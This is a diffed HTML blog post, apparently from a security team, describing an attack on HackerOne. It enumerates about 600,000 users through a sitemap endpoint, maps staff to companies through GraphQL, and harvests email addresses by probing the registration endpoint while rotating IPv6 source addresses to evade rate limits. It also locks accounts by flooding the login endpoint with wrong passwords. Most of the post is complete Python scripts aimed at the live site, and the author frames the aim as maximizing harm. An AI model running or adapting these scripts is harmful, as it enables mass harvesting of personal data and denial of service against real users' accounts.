@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="">
+	<meta charset="UTF-8">
+<link rel="icon" type="image/x-icon" href="/statics/img/favicon.ico">
+<title>
+	
+		Enum H1 Staff and Users email addresses and Lock accounts -
+	
+	Symbo1
+</title>
+
+<meta name="theme-color" content="#232323">
+<meta name="description" content="Symbo1 Security Team Post.">
+<meta name="keywords" content="">
+<meta name="author" content="Tr3jer_CongRong.">
+<meta name="referrer" content="no-referrer" />
+<link rel="alternate" type="application/rss+xml" title="Symbo1's RSS Feed" href="/feed.xml">
+<link rel="stylesheet" type="text/css" href="/statics/css/style.css">
+
+
+
+	<body>
+		<header>
+	<pre class="ascii name">
+  ____                        _               _ 
+ / ___|   _   _   _ __ ___   | |__     ___   / |
+ \___ \  | | | | | '_ ` _ \  | '_ \   / _ \  | |
+  ___) | | |_| | | | | | | | | |_) | | (_) | | |
+ |____/   \__, | |_| |_| |_| |_.__/   \___/  |_|
+          |___/                                 
+          	Security Team.
+	</pre>
+</header>
+		<nav>
+	<ul>
+		<li><a href="/">Index</a></li>&nbsp;&nbsp;|
+		<li><a href="/acknowledgement">Acknowledgement</a></li>&nbsp;&nbsp;|
+		<li><a href="/archives">Archives</a></li>&nbsp;&nbsp;|
+		<li><a href="http://github.com/symbo1" target="_blank">Projects</a></li>&nbsp;&nbsp;|
+		<li><a href="/members">Members</a></li>&nbsp;&nbsp;|
+		<li><a href="/about">About</a></li>
+	</ul>
+</nav>
+
+		<main>
+			<style>
+	body{
+		word-break:break-word;
+	}
+</style>
+
+<div class="post-content">
+<div id="post">
+<h1 align="center">Enum H1 Staff and Users email addresses and Lock accounts</h1>
+<!-- <link rel="stylesheet" type="text/css" href="/statics/css/syntax.css"> -->
+  <p align="right" class="date">14 Dec 2019 - CongRong</p>
+
+<p>I found https://hackerone.com/sitemap.json a few months ago, but saw that only users starting withawere returned, but later I found out that it can be accessed via the parameterfirstEnumerate all users:</p>
+
+<figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="err">https://hackerone.com/sitemap.json?first=[a-z]</span></code></pre></figure>
+
+<p>After I got the id of nearly 600,000 users, thinking about how to use this data to maximize the harm?</p>
+
+<p>So I thought of three ideas:</p>
+
+<ol>
+  <li>By requesting the <code class="highlighter-rouge">graphql</code> interface, query the team that each user belongs to. Reverse this result into: List of companies-&gt; Staff. (Unrestricted)</li>
+  <li>Merge all common email addresses with ids, and enumerate whether the email addresses exists in the registration interface. (Limited, but can be bypassed with more IPv6)</li>
+  <li>Finally, you can use the blasted email addresses to log-in to the interface and request more than 100+ wrong passwords to lock your account. XD</li>
+</ol>
+
+<h2 id="0x01-company---staff">0x01 Company -&gt; Staff:</h2>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
+<span class="c">#coding:utf-8</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="k">print</span> <span class="n">name</span>
+    <span class="n">datas</span> <span class="o">=</span> <span class="p">{</span><span class="s">"operationName"</span><span class="p">:</span><span class="s">"getTeams"</span><span class="p">,</span><span class="s">"variables"</span><span class="p">:{</span><span class="s">"username"</span><span class="p">:</span><span class="s">"{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">)},</span><span class="s">"query"</span><span class="p">:</span><span class="s">"query getTeams($username: String!) {</span><span class="se">\n</span><span class="s">  user(username: $username) {</span><span class="se">\n</span><span class="s">    memberships(first: 10, where: {concealed: {_eq: false}}) {</span><span class="se">\n</span><span class="s">      total_count</span><span class="se">\n</span><span class="s">      edges {</span><span class="se">\n</span><span class="s">        node {</span><span class="se">\n</span><span class="s">          id</span><span class="se">\n</span><span class="s">          team {</span><span class="se">\n</span><span class="s">            id</span><span class="se">\n</span><span class="s">            name</span><span class="se">\n</span><span class="s">            handle</span><span class="se">\n</span><span class="s">            state</span><span class="se">\n</span><span class="s">            profile_picture(size: small)</span><span class="se">\n</span><span class="s">            __typename</span><span class="se">\n</span><span class="s">          }</span><span class="se">\n</span><span class="s">          __typename</span><span class="se">\n</span><span class="s">        }</span><span class="se">\n</span><span class="s">        __typename</span><span class="se">\n</span><span class="s">      }</span><span class="se">\n</span><span class="s">      __typename</span><span class="se">\n</span><span class="s">    }</span><span class="se">\n</span><span class="s">    __typename</span><span class="se">\n</span><span class="s">  }</span><span class="se">\n</span><span class="s">}</span><span class="se">\n</span><span class="s">"</span><span class="p">}</span>
+
+    <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+        <span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0"</span><span class="p">,</span>
+        <span class="s">"content-type"</span><span class="p">:</span> <span class="s">"application/json"</span><span class="p">,</span>
+        <span class="s">"x-auth-token"</span><span class="p">:</span> <span class="s">"----"</span><span class="p">,</span>
+        <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span>
+    <span class="p">}</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"https://hackerone.com/graphql"</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span> <span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">datas</span><span class="p">),</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)[</span><span class="s">'data'</span><span class="p">][</span><span class="s">'user'</span><span class="p">][</span><span class="s">'memberships'</span><span class="p">]</span>
+        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">ret</span><span class="p">[</span><span class="s">'total_count'</span><span class="p">],</span><span class="nb">int</span><span class="p">):</span>
+            <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"done.txt"</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">name</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+            <span class="k">if</span> <span class="n">ret</span><span class="p">[</span><span class="s">'total_count'</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">results</span> <span class="o">=</span> <span class="p">{</span><span class="n">name</span><span class="p">:[</span><span class="n">team</span><span class="p">[</span><span class="s">'node'</span><span class="p">][</span><span class="s">'team'</span><span class="p">][</span><span class="s">'handle'</span><span class="p">]</span> <span class="k">for</span> <span class="n">team</span> <span class="ow">in</span> <span class="n">ret</span><span class="p">[</span><span class="s">'edges'</span><span class="p">]]}</span>
+                <span class="k">print</span> <span class="n">results</span>
+                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"results/{}.txt"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">),</span><span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
+                    <span class="n">json</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">results</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">ensure_ascii</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span><span class="p">,</span><span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span> <span class="n">e</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">done</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s">"done.txt"</span><span class="p">)]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"{}.txt"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">jf</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">jf</span><span class="p">[</span><span class="s">'users'</span><span class="p">]:</span>
+                <span class="k">if</span> <span class="n">k</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">done</span><span class="p">:</span>
+                    <span class="n">ret</span> <span class="o">=</span> <span class="n">main</span><span class="p">(</span><span class="n">k</span><span class="p">[</span><span class="s">'username'</span><span class="p">])</span></code></pre></figure>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa2.png" alt="" /></p>
+
+<p>After reversing, the staff corresponding to the company is generated:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#coding:utf-8</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+	<span class="n">companys</span> <span class="o">=</span> <span class="p">{}</span>
+	<span class="n">staffs</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">'results'</span><span class="p">)</span>
+	<span class="k">for</span> <span class="n">sf</span> <span class="ow">in</span> <span class="nb">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span><span class="n">x</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span> <span class="o">==</span> <span class="s">'.txt'</span><span class="p">,</span><span class="n">staffs</span><span class="p">):</span>
+		<span class="n">staff</span> <span class="o">=</span> <span class="n">sf</span><span class="p">[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'results/{}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sf</span><span class="p">))</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+			<span class="n">sTmp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+			<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">sTmp</span><span class="o">.</span><span class="n">values</span><span class="p">()[</span><span class="mi">0</span><span class="p">]:</span>
+				<span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">companys</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+					<span class="n">companys</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span>
+				<span class="n">companys</span><span class="p">[</span><span class="n">c</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">staff</span><span class="p">)</span>
+
+	<span class="n">profiles</span> <span class="o">=</span> <span class="p">{}</span>
+
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">:</span>
+		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"{}.txt"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+			<span class="n">jf</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+			<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">jf</span><span class="p">[</span><span class="s">'profiles'</span><span class="p">]:</span>
+				<span class="n">profiles</span><span class="p">[</span><span class="n">k</span><span class="p">[</span><span class="s">'handle'</span><span class="p">]]</span> <span class="o">=</span> <span class="n">k</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span>
+
+	<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"staffList.txt"</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+	<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"| Company (347) | Staff (3488) |</span><span class="se">\n</span><span class="s">| --- | --- |</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="n">companys</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+		<span class="n">inc</span> <span class="o">=</span> <span class="n">profiles</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="k">if</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">profiles</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span> <span class="k">else</span> <span class="n">k</span>
+		<span class="n">users</span> <span class="o">=</span> <span class="p">[]</span>
+		<span class="k">for</span> <span class="n">u</span> <span class="ow">in</span> <span class="n">v</span><span class="p">:</span>
+			<span class="n">users</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">"[{}](https://hackerone.com/{})"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">u</span><span class="p">,</span><span class="n">u</span><span class="p">))</span>
+		<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'| [{}](https://hackerone.com/{}) | '</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">inc</span><span class="p">,</span><span class="n">k</span><span class="p">)</span> <span class="o">+</span> <span class="s">'、'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">users</span><span class="p">)</span> <span class="o">+</span> <span class="s">' |</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+	<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+	<span class="n">main</span><span class="p">()</span></code></pre></figure>
+
+<p>So I have a list of <code class="highlighter-rouge">347</code> teams corresponding to <code class="highlighter-rouge">3488</code> staff XD</p>
+
+<p><a href="https://github.com/Symbo1/HackerOne-Staffs" target="_blank">https://github.com/Symbo1/HackerOne-Staffs</a></p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa3.png" alt="" /></p>
+
+<h2 id="0x02-enumeration-email-addresses">0x02 Enumeration email addresses:</h2>
+
+<p>Under normal circumstances, the registered API will be frequency-limited, but can be bypassed by adding a large number of IPv6 enumerations:</p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa4.png" alt="" /></p>
+
+<p>Here only use gmail for testing, in fact, you can also add outlook, yahoo, mail.ru …</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">netifaces</span>
+<span class="kn">from</span> <span class="nn">gevent</span> <span class="kn">import</span> <span class="n">monkey</span>
+<span class="kn">from</span> <span class="nn">gevent.pool</span> <span class="kn">import</span> <span class="n">Pool</span>
+<span class="kn">from</span> <span class="nn">requests_toolbelt.adapters</span> <span class="kn">import</span> <span class="n">source</span>
+
+<span class="n">monkey</span><span class="o">.</span><span class="n">patch_all</span><span class="p">()</span>
+<span class="n">interfaces</span> <span class="o">=</span> <span class="s">'ens3'</span>
+
+<span class="n">ips</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">ipv6</span> <span class="ow">in</span> <span class="n">netifaces</span><span class="o">.</span><span class="n">ifaddresses</span><span class="p">(</span><span class="n">interfaces</span><span class="p">)[</span><span class="n">netifaces</span><span class="o">.</span><span class="n">AF_INET6</span><span class="p">]:</span>
+	<span class="k">if</span> <span class="ow">not</span> <span class="n">ipv6</span><span class="p">[</span><span class="s">'addr'</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">"fe80"</span><span class="p">:</span>
+		<span class="n">ips</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ipv6</span><span class="p">[</span><span class="s">'addr'</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+	<span class="k">print</span> <span class="n">username</span>
+	<span class="n">email</span> <span class="o">=</span> <span class="s">"{}@gmail.com"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+	<span class="n">datas</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="s">"user[email]"</span><span class="p">:</span> <span class="n">email</span>
+	<span class="p">}</span>
+
+	<span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+		<span class="s">"User-Agent"</span><span class="p">:</span><span class="s">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0"</span><span class="p">,</span>
+		<span class="s">"Accept"</span><span class="p">:</span><span class="s">"application/json, text/javascript, */*; q=0.01"</span><span class="p">,</span>
+		<span class="s">"X-CSRF-Token"</span><span class="p">:</span><span class="s">"..."</span><span class="p">,</span>
+		<span class="s">"Content-Type"</span><span class="p">:</span><span class="s">"application/x-www-form-urlencoded; charset=UTF-8"</span><span class="p">,</span>
+		<span class="s">"X-Requested-With"</span><span class="p">:</span><span class="s">"XMLHttpRequest"</span><span class="p">,</span>
+		<span class="s">"Cookie"</span><span class="p">:</span> <span class="s">"..."</span><span class="p">,</span>
+		<span class="s">"Connection"</span><span class="p">:</span><span class="s">"keep-alive"</span>
+	<span class="p">}</span>
+	<span class="k">try</span><span class="p">:</span>
+
+		<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+		<span class="n">new_source</span> <span class="o">=</span> <span class="n">source</span><span class="o">.</span><span class="n">SourceAddressAdapter</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">ips</span><span class="p">))</span>
+		<span class="n">s</span><span class="o">.</span><span class="n">mount</span><span class="p">(</span><span class="s">'http://'</span><span class="p">,</span> <span class="n">new_source</span><span class="p">)</span>
+		<span class="n">s</span><span class="o">.</span><span class="n">mount</span><span class="p">(</span><span class="s">'https://'</span><span class="p">,</span> <span class="n">new_source</span><span class="p">)</span>
+
+		<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"https://hackerone.com/users"</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span> <span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">datas</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+		<span class="n">ret</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)[</span><span class="s">"errors"</span><span class="p">]</span>
+		<span class="k">if</span> <span class="n">ret</span><span class="p">:</span>
+			<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"email-done.txt"</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+			<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">username</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+			<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+			<span class="k">if</span> <span class="s">"email"</span> <span class="ow">in</span> <span class="n">ret</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+				<span class="k">print</span> <span class="n">email</span>
+				<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"emails.txt"</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+				<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">email</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+				<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+	<span class="k">except</span> <span class="nb">Exception</span><span class="p">,</span><span class="n">e</span><span class="p">:</span>
+		<span class="k">print</span> <span class="n">e</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+	<span class="n">tasks</span> <span class="o">=</span> <span class="p">[]</span>
+	<span class="n">done</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s">"email-done.txt"</span><span class="p">)]</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">[:</span><span class="mi">1</span><span class="p">]:</span>
+		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"{}.txt"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+			<span class="n">jf</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+			<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">jf</span><span class="p">[</span><span class="s">'users'</span><span class="p">]:</span>
+				<span class="k">if</span> <span class="n">k</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">done</span><span class="p">:</span>
+					<span class="n">tasks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">k</span><span class="p">[</span><span class="s">'username'</span><span class="p">])</span>
+	<span class="n">pool</span> <span class="o">=</span> <span class="n">Pool</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
+	<span class="n">pool</span><span class="o">.</span><span class="nb">map</span><span class="p">(</span><span class="n">main</span><span class="p">,</span> <span class="n">tasks</span><span class="p">)</span></code></pre></figure>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa5.png" alt="" /></p>
+
+<p>After enumerating <code class="highlighter-rouge">30k+</code> ID’s I stopped the testing, and <code class="highlighter-rouge">2887</code> of them returned with success: (ps. emmmm悄悄的说，后来我获取到了几万)</p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa0.png" alt="" /></p>
+
+<p>As such, for total <code class="highlighter-rouge">600k</code> ID’s, we may be able to get at least tens thousands of valid email addresses.</p>
+
+<h2 id="0x03-lock-accounts">0x03 Lock accounts:</h2>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">netifaces</span>
+<span class="kn">from</span> <span class="nn">gevent</span> <span class="kn">import</span> <span class="n">monkey</span>
+<span class="kn">from</span> <span class="nn">gevent.pool</span> <span class="kn">import</span> <span class="n">Pool</span>
+<span class="kn">from</span> <span class="nn">requests_toolbelt.adapters</span> <span class="kn">import</span> <span class="n">source</span>
+
+<span class="n">monkey</span><span class="o">.</span><span class="n">patch_all</span><span class="p">()</span>
+<span class="n">interfaces</span> <span class="o">=</span> <span class="s">'ens3'</span>
+
+<span class="n">ips</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">ipv6</span> <span class="ow">in</span> <span class="n">netifaces</span><span class="o">.</span><span class="n">ifaddresses</span><span class="p">(</span><span class="n">interfaces</span><span class="p">)[</span><span class="n">netifaces</span><span class="o">.</span><span class="n">AF_INET6</span><span class="p">]:</span>
+	<span class="k">if</span> <span class="ow">not</span> <span class="n">ipv6</span><span class="p">[</span><span class="s">'addr'</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">"fe80"</span><span class="p">:</span>
+		<span class="n">ips</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ipv6</span><span class="p">[</span><span class="s">'addr'</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">email</span><span class="p">):</span>
+	<span class="n">datas</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="s">"email"</span><span class="p">:</span><span class="n">email</span><span class="p">,</span>
+		<span class="s">"password"</span><span class="p">:</span><span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">,</span><span class="mi">10</span><span class="p">)),</span>
+		<span class="s">"remember_me"</span><span class="p">:</span><span class="s">"false"</span>
+	<span class="p">}</span>
+
+	<span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+		<span class="s">"User-Agent"</span><span class="p">:</span><span class="s">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0"</span><span class="p">,</span>
+		<span class="s">"Accept"</span><span class="p">:</span><span class="s">"application/json, text/javascript, */*; q=0.01"</span><span class="p">,</span>
+		<span class="s">"X-CSRF-Token"</span><span class="p">:</span><span class="s">"..."</span><span class="p">,</span>
+		<span class="s">"Content-Type"</span><span class="p">:</span><span class="s">"application/x-www-form-urlencoded; charset=UTF-8"</span><span class="p">,</span>
+		<span class="s">"X-Requested-With"</span><span class="p">:</span><span class="s">"XMLHttpRequest"</span><span class="p">,</span>
+		<span class="s">"Cookie"</span><span class="p">:</span> <span class="s">"..."</span><span class="p">,</span>
+		<span class="s">"Connection"</span><span class="p">:</span><span class="s">"keep-alive"</span>
+	<span class="p">}</span>
+	<span class="k">try</span><span class="p">:</span>
+
+		<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+		<span class="n">new_source</span> <span class="o">=</span> <span class="n">source</span><span class="o">.</span><span class="n">SourceAddressAdapter</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">ips</span><span class="p">))</span>
+		<span class="n">s</span><span class="o">.</span><span class="n">mount</span><span class="p">(</span><span class="s">'http://'</span><span class="p">,</span> <span class="n">new_source</span><span class="p">)</span>
+		<span class="n">s</span><span class="o">.</span><span class="n">mount</span><span class="p">(</span><span class="s">'https://'</span><span class="p">,</span> <span class="n">new_source</span><span class="p">)</span>
+
+		<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"https://hackerone.com/sessions"</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span> <span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">datas</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+		<span class="k">print</span> <span class="s">"password: {} {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">datas</span><span class="p">[</span><span class="s">'password'</span><span class="p">],</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+	<span class="k">except</span> <span class="nb">Exception</span><span class="p">,</span><span class="n">e</span><span class="p">:</span>
+		<span class="k">print</span> <span class="n">e</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+	<span class="n">tasks</span> <span class="o">=</span> <span class="p">[</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span><span class="o">*</span><span class="mi">110</span>
+	<span class="n">pool</span> <span class="o">=</span> <span class="n">Pool</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
